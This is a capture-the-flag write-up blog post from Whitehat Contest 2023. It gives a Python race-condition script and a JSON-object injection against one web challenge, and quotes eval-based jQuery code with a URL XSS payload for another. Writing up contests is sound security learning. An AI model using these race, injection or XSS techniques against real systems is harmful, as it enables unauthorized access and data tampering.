---
title: Whitehat Contest 2023
date: 2023-10-30
categories: [CTF]
tags: [Write up]
---

## Information 
Team name: `YouAreMyUniverse`  
Rank: `3rd place`

## Write up
### web/atten-dance  

#### Desc
Get first flag with race condition attack,  
Get second flag with sql injection ( `Json injection` )
#### Exploit
```python
import requests
import threading
import time

url = 'http://13.209.18.49:3000'

# Flag 1

requests.get(f"{url}/join", params={"username": "dummy"})
time.sleep(1)

def worker(thread_num):
    requests.get(f"{url}/check", params={"username": "dummy"})

threads = []

for i in range(100):
    thread = threading.Thread(target=worker, args=(i,))
    threads.append(thread)
    thread.start()

res = requests.get(f"{url}/claim", params={"username": "dummy"})
print(res.text)

# Flag2

res = requests.post(f"{url}/del", json={"username": {"contains": "a"}})
print(res.text)
```

### web/oshinolist  

#### Desc
XSS with eval
```javascript
// File: CustomPlayer.js

$("video[id*=video_]").on("loadeddata", function () {
    const selected_id = $(this).attr("id").replace("video_", "");
    if ($("#source_" + selected_id).length == 0) {
        try {
            eval(`type_${selected_id}()`);
        } catch (e) { }
    }
});
```
#### Exploit
```plaintext
?urls=https://video.mp4,https://video.mp4?a.a:eval(atob("payload"))
```  
  
## Comment
It was Fun and Helpful CTF with Good quality Wargame.  
I'm happy to have won third place, and I am thankful to the `team members`.